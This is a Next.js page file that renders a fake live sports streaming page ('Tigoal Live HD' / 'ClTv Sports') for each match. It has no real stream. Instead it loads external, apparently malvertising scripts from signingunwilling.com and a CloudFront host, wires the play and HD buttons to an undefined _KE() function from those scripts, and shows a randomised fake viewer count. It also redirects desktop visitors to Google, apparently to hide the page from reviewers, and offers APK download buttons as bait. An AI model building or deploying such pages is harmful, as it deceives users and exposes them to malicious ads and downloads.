import fs from "fs";
import path from "path";
import { notFound } from "next/navigation";

function slugify(text) {
  return text
    .toString()
    .toLowerCase()
    .replace(/\s+/g, "-")
    .replace(/[^\w-]+/g, "")
    .replace(/--+/g, "-")
    .replace(/^-+/, "")
    .replace(/-+$/, "");
}

export async function generateMetadata({ params }) {
  const dataPath = path.join(process.cwd(), "data", "matches.json");
  const jsonData = JSON.parse(fs.readFileSync(dataPath, "utf-8"));

  const slugParam = params.slug.toLowerCase();
  const match = jsonData.find((m) => slugify(m.title) === slugParam);

  if (!match) {
    return {
      title: "404 | Tidak Ditemukan",
      description: "Pertandingan tidak ditemukan.",
    };
  }

  const ogImage = match.img_thumb || match.url_img_a || "/ico.jpg";

  return {
    title: match.title,
    description: `${match.title_tim_a} vs ${match.title_tim_b}`,
    openGraph: {
      title: match.title,
      description: `${match.title_tim_a} vs ${match.title_tim_b}`,
      images: [ogImage],
    },
    twitter: {
      card: "summary_large_image",
      title: match.title,
      description: `${match.title_tim_a} vs ${match.title_tim_b}`,
      images: [ogImage],
    },
  };
}

export default function LivePage({ params }) {
  const dataPath = path.join(process.cwd(), "data", "matches.json");
  const jsonData = JSON.parse(fs.readFileSync(dataPath, "utf-8"));

  const slugParam = params.slug.toLowerCase();
  const match = jsonData.find((m) => slugify(m.title) === slugParam);

  if (!match) return notFound();

  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${match.title} | Tigoal Live HD</title>
<meta name="google" content="notranslate">
<link rel="icon" type="image/x-icon" href="/ico.jpg">
<link href="https://fonts.googleapis.com/css2?family=LXGW+Marker+Gothic&family=Poppins:wght@100;400;700&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
<link href="/style.css" rel="stylesheet">

<script type='text/javascript' src='//signingunwilling.com/63/1d/71/631d718e79ef6f18378d6cc0ddcea5cf.js'></script>
<script type="text/javascript">
    var qzyyM_GmH_UnThec={"it":4566373,"key":"a7306"};
</script>
<script src="https://d1y0yks1k8t5m5.cloudfront.net/ff3d778.js"></script>
</head>
<body class="notranslate">

  <header>
    <div class="logo">
      <img src="/logo.png" alt="Logo">
      <span>ClTv Sports</span>
    </div>
    <div class="menu-icons">
      <span class="material-icons">menu</span>
      <span class="material-icons">settings</span>
    </div>
  </header>

  <section class="match">
    <h2>Live Match: ${match.title}</h2>
    <div class="teams">
      <div class="team">
        <img src="${match.url_img_a}" alt="${match.title_tim_a}">
        <span>${match.title_tim_a}</span>
      </div>
      <div class="vs">VS</div>
      <div class="team">
        <img src="${match.url_img_b}" alt="${match.title_tim_b}">
        <span>${match.title_tim_b}</span>
      </div>
    </div>
  </section>

  <div class="player" style="background-image: url('${match.img_thumb || ""}');">
    <div class="live-badge">LIVE <span class="viewers">• 5.2K Watching</span></div>
    <div class="overlay"></div>
    <div class="play-btn" onclick="_KE()">
      <span class="material-icons">play_arrow</span>
    </div>

    <div class="video-controls">
      <div class="quality">480P</div>
      <span class="material-icons control-btn">volume_up</span>
      <span class="material-icons control-btn">fullscreen</span>
    </div>
  </div>

  <a href="#" class="watch-now" onclick="_KE()">Stream 720 [HD]</a>

  <div class="actions">
    <div class="btn apk"><span class="material-icons">android</span> APK</div>
    <div class="btn tv"><span class="material-icons">tv</span> TV</div>
    <div class="btn tg"><span class="material-icons">send</span> TG</div>
  </div>

  <footer>© 2025 ClTv Sports. All rights reserved.</footer>

  <script>
    if (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
      window.location.href = "https://www.google.com";
    }

    function randomViewers() {
      const viewersEl = document.querySelector('.live-badge .viewers');
      if (!viewersEl) return;
      let base = 4800 + Math.floor(Math.random() * 1000);
      let suffix = base > 999 ? (base / 1000).toFixed(1) + 'K' : base;
      viewersEl.textContent = '• ' + suffix + ' Watching';
    }

    setInterval(randomViewers, Math.floor(Math.random() * 3000) + 3000);
    randomViewers();
  </script>

</body>
</html>
`;

  return new Response(html, {
    headers: { "Content-Type": "text/html" },
  });
}
